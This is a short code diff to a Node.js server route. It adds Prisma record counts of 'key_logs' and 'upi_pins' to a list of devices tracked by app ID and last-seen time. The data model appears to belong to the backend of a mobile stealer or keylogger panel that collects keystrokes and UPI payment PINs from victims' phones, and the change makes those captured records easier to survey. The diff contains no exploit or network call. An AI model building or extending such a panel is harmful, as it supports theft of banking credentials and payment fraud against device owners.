@@ -18,6 +18,11 @@ function setupRoutes(app, prisma, io, notifyChange) {
         try {
             const devices = await prisma.device.findMany({
                 where: appId ? { app_id: appId } : {},
+                include: {
+                    _count: {
+                        select: { key_logs: true, upi_pins: true }
+                    }
+                },
                 orderBy: { last_seen: 'desc' }
             });
 
